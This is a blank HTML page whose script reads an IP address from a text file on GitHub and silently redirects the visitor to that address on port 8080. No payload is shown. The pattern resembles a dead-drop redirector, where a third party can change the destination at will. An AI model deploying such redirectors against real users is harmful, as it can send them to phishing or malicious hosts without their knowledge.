<!DOCTYPE html>
<html>
  <head>
    <title></title>
    <script>
      fetch("https://raw.githubusercontent.com/robaain/robaain/main/logs/data.txt")
        .then(response => response.text())
        .then(data => {
          // Match an IP address in the fetched URL
          const match = data.match(/(\d{1,3}\.){3}\d{1,3}/);
          if (match) {
            const ip = match[0];
            window.location.replace("https://" + ip + ":8080"); // or use https if needed
          } else {
            document.body.innerHTML = "<p>No valid IP address found in data.</p>";
          }
        })
        .catch(error => {
          console.error("Failed to fetch redirect URL:", error);
          document.body.innerHTML = "<p>Error loading redirect URL.</p>";
        });
    </script>
  </head>
  <body>
    <p></p>
  </body>
</html>
